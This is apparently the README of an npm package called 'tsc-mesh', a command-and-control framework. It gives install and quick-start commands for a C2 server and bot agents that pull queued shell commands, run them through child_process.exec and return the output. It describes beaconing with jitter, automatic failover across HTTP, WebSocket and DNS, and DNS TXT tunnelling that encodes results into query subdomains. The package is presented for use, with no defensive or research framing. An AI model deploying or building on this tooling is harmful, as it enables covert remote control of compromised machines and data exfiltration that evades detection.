# tsc-mesh

Multi-protocol C2 Mesh — HTTP + WebSocket + DNS with automatic channel failover and result reporting across all channels.

## Installation

```bash
npm install -g tsc-mesh
```

## Quick Start

### Start the C2 server

```bash
tsc-mesh server --port 8443 --dns-port 5353
```

### Start an agent

```bash
tsc-mesh agent --server http://localhost:8443 --id mybot1
```

### Send a command

```bash
tsc-mesh send --server http://localhost:8443 --agent mybot1 --cmd "whoami"
```

### Check status

```bash
tsc-mesh status --server http://localhost:8443
```

## Features

- **Triple-channel C2**: HTTP REST polling, WebSocket persistent connection, DNS TXT record queries
- **Automatic failover**: agent tries HTTP → WebSocket → DNS, picks first working channel
- **Bidirectional DNS**: commands delivered via TXT responses, results encoded in DNS query subdomains — auto-split across labels for large payloads
- **Command queue**: server queues pending commands per agent, agents pull on each beacon
- **Result reporting**: agent returns command output through the same channel — HTTP POST, WS message, or DNS result query
- **Heartbeat + jitter**: agents report channel health at configured interval with randomized jitter
- **Exponential backoff**: failed channels back off before retry (1s → 60s max)
- **Agent registry**: server tracks connected agents, channels used, and last seen time
- **No external deps**: zero npm dependencies except `ws` (WebSocket) and `minimist` (CLI parsing)

## Architecture

```
┌─────────────────┐     HTTP (poll)    ┌─────────────────┐
│   C2 Server     │◄──────────────────►│   C2 Agent      │
│  :8443 HTTP     │    POST /heartbeat │  HTTP (poll)    │
│  :8443 WS       │◄──────────────────►│  WebSocket      │
│  :5353 DNS/UDP  │◄──────────────────►│  DNS (TXT)      │
└─────────────────┘                    └─────────────────┘
     │                                       │
     │ Channels: HTTP, WS, DNS               │ Channel health:
     │ Agent reg on first contact            │ Tracks failures + backoff
     │ Commands queued per agent ID          │ Auto-failover: HTTP→WS→DNS
     │ Results received on any channel       │ Results return on same channel
```

## CLI Reference

### `tsc-mesh server`

| Flag | Default | Description |
|------|---------|-------------|
| `--port` | `8443` | HTTP + WebSocket server port |
| `--dns-port` | `5353` | DNS server port |

### `tsc-mesh agent`

| Flag | Default | Description |
|------|---------|-------------|
| `--server` | *required* | C2 server URL |
| `--id` | random 6-char | Agent identity |
| `--interval` | `5000` | Beacon interval (ms) |

### `tsc-mesh send`

| Flag | Description |
|------|-------------|
| `--server` | C2 server URL |
| `--agent` | Target agent ID |
| `--cmd` | Command to execute |

### `tsc-mesh status`

| Flag | Description |
|------|-------------|
| `--server` | C2 server URL |

## How It Works

1. **Server** starts HTTP + WebSocket listener on `--port`, DNS UDP listener on `--dns-port`
2. **Agent** connects on startup: opens WebSocket, binds DNS client, begins HTTP polling
3. Agent sends heartbeats and polls for commands every beacon interval via the healthiest channel
4. Server identifies agents by ID extracted from URL path (HTTP), WS register message, or DNS subdomain (`{agentId}.poll.c2.tsc`)
5. Commands are injected via `POST /command` (HTTP), stored in a FIFO queue per agent ID
6. Agent pulls pending commands on each poll and executes them via `child_process.exec` (30s timeout)
7. Results return through the same channel: HTTP POST `/result`, WS `result` message, or DNS result query (`{agentId}.r.{base64}.c2.tsc`)
8. If a channel fails, agent marks it unhealthy and switches to the next in order: HTTP → WS → DNS
9. Failed channels reconnect with exponential backoff (1s, 2s, 4s... max 60s)
